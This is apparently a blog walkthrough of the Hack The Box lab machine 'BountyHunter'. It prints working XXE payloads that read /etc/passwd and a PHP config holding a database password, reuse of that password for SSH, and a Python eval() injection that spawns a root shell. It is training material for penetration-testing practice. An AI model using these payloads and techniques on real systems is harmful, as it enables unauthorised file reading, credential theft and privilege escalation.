---
layout: post
title: HTB BountyHunter  
subtitle: Easy Box
thumbnail-img: /assets/img/bounty_hunter/bountyHunter.png
tags: [HTB]
---

# Notes
![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bounty_hunter/bountyHunter.png)


| Name | BountyHunter |
| :------ |:--- |
| OS | Linux |
| RELEASE DATE | 24 July 2021 |
| DIFFICULTY | Easy |

# Port Scan
IP:10.10.11.100
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 22
Low attack surface so I'll skip to port 80

## Port 80

The first thing I did was start some recon with ffuf. (note db.php will come into play later)
```
┌──(root💀kali)-[~/htb/bountyhunter]
└─# ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.100/FUZZ -t 200 -c -e .php                                                                 1 ⨯
                                                                                               
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/                                                        
                                                                                               
       v1.3.1 Kali Exclusive <3
________________________________________________                      
                                                                                               
 :: Method           : GET                                                                     
 :: URL              : http://10.10.11.100/FUZZ                   
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .php                                                                    
 :: Follow redirects : false                                                                   
 :: Calibration      : false                                                                   
 :: Timeout          : 10                                                                      
 :: Threads          : 200                                                                     
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                       
________________________________________________

db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
resources               [Status: 301, Size: 316, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]

```

Looking inside /resources there was a readme
```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

Going to `/portal.php` we can see that it is under development and we get send to a bounty tracker `/log_submit.php` after filling out the form I decide to intercept it in burp. It looks like the data is being base64 encoded
```
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 207
Origin: http://10.10.11.100
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4xPC90aXRsZT4KCQk8Y3dlPjE8L2N3ZT4KCQk8Y3Zzcz4xPC9jdnNzPgoJCTxyZXdhcmQ%2BMTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

After decoding it it looks like it is xml
```
┌──(root💀kali)-[~/htb/bountyhunter]
└─# echo -n PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4xPC90aXRsZT4KCQk8Y3dlPjE8L2N3ZT4KCQk8Y3Zzcz4xPC9jdnNzPgoJCTxyZXdhcmQ%2BMTwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg | base64 -d 
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>1</title>
                <cwe>1</cwe>
                <cvss>1</cvss>
                <rewardbase64: invalid input

```

I thought that there might be some way to insert a payload so I googled "XML payloads" and I found a github repo with lots of them https://github.com/payloadbox/xxe-injection-payload-list. The one we want is "XXE: Local File Inclusion"

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```

Then we base64 encode it and I got: 
`PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj4gXT4KPGJ1Z3JlcG9ydD4KPHRpdGxlPnRlc3Q8L3RpdGxlPgo8Y3dlPnRlc3Q8L2N3ZT4KPGN2c3M+dGVzdDwvY3Zzcz4KPHJld2FyZD4mZmlsZTs8L3Jld2FyZD4KPC9idWdyZXBvcnQ+`

Then I put in the base64 encoded string into `data=` and it returned the `/etc/passwd` file. (make sure to url encode)
![BountyHunter](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bounty_hunter/bounty_request.png)

Response
![BountyHunter](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/bounty_hunter/bounty_passwd.png)

Now we can use the file inclusion to read the `db.php` file we discovered before. Because PHP is a server side language we cant read `db.php`. The server parses the contents and the if there is a output it will send it to the server. 

To understand this better, here is the complete process of what happens when you go to the following php url `http://10.10.11.100/db.php`
-   The browser sends the request to the web server.
-   The web server parses the php script
-   The server executes the contents of the script.
-   After execution, it send a response to our browser.
	-   In the case of db.php there is no output

Simply put our browsers can only render HTML, CSS and JavaScript. PHP is server side

Because we now have a LFI we can use a php wrapper to get the contents of the file, base64 encode it and output it. 
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<reward>&file;</reward>

BASE64
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI+IF0+CjxidWdyZXBvcnQ+Cjx0aXRsZT50ZXN0PC90aXRsZT4KPGN3ZT50ZXN0PC9jd2U+CjxjdnNzPnRlc3Q8L2N2c3M+CjxyZXdhcmQ+JmZpbGU7PC9yZXdhcmQ+CjwvYnVncmVwb3J0Pg==

URL ENCODED BASE64
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI%2bIF0%2bCjxidWdyZXBvcnQ%2bCjx0aXRsZT50ZXN0PC90aXRsZT4KPGN3ZT50ZXN0PC9jd2U%2bCjxjdnNzPnRlc3Q8L2N2c3M%2bCjxyZXdhcmQ%2bJmZpbGU7PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pg%3d%3d
```

Request
```
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.10.11.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 367
Origin: http://10.10.11.100
Connection: close
Referer: http://10.10.11.100/log_submit.php

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWwo8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI%2bIF0%2bCjxidWdyZXBvcnQ%2bCjx0aXRsZT50ZXN0PC90aXRsZT4KPGN3ZT50ZXN0PC9jd2U%2bCjxjdnNzPnRlc3Q8L2N2c3M%2bCjxyZXdhcmQ%2bJmZpbGU7PC9yZXdhcmQ%2bCjwvYnVncmVwb3J0Pg%3d%3d
```

We get a response of the base64 encoded file
```
    <td>
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
	</td>
```

We can decode it and fine a database username and password
```
┌──(root💀kali)-[~/htb/bountyhunter]
└─# echo -n 'PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=' | base64 -d
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Looking back at the `/etc/passwd` we learned that there was one user called "development" so lets try using the password to log in via ssh
```
┌──(root💀kali)-[~/htb/bountyhunter]
└─# ssh development@10.10.11.100                                                                                                                                                        130 ⨯
development@10.10.11.100's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
```

## Root
The first thing I did was run `sudo -l` and I found I could run sudo for a custom script
```
 (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Lets take a look. I broke it down inline
```python
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#This function will check if the provided files is a .md 
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

#This function will Ceck if the first 3 lines if they contain a string 
#1. "# Skytrain Inc" 
#2. "## Ticket to " 
#3. "__Ticket Code:__". 
def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

#This is where the priv esc is. 
#If all the above checks pass it will take our number provided in the 4th line and remove "**" turning ""**11+"" into "11".
#Then it will evaluate if 11 divided by 7 has a remainder of 4 (it does)
#Because it has a remainder of 4 it will set a variable called "validationNumber" and run "eval()". Evail is a dangerous function
#The eval() function takes strings and executes them as code, for example eval('2+2') would return 4, we can use this to execute arbitray code on the system
        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```
 
 Now that we understand the requirements we can create a ticket. The last line will evaluate 11 + 1 == 12 and spawn a shell. (read the notes in the code above). This works because eval() lets us execute arbitrary code. We could have it print a string or do more math, but in this case just spawn a shell as root (because its running as root)
 root.md
 ```
 # Skytrain Inc
 ## Ticket to 
 __Ticket Code:__
**11+ 1 == 12 and __import__('os').system('/bin/bash')
 ```
 
Execution
```
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
root.md
Destination: 
root@bountyhunter:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```
